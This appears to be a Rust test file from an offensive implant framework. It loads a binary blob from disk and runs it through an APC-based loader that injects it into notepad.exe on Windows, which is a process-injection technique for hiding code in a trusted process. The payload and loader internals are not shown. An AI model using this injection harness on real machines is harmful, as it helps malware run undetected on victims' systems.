#[cfg(target_os = "windows")]
#[test]
pub fn test_loader() {
    let mut str = String::new();
    let _ = std::io::stdin().read_line(&mut str);
    let file = std::fs::read("../loader.bin").unwrap();
    println!("[+] file size: {}", file.len());
    unsafe {
        let loader = malefic_helper::win::loader::apc::loader(
            file,
            false,
            "C:\\Windows\\System32\\notepad.exe\x00".as_ptr() as _,
            0,
            true,
            true,
        );
        println!("{:#?}", loader);
    }
    let _ = std::io::stdin().read_line(&mut str);
}
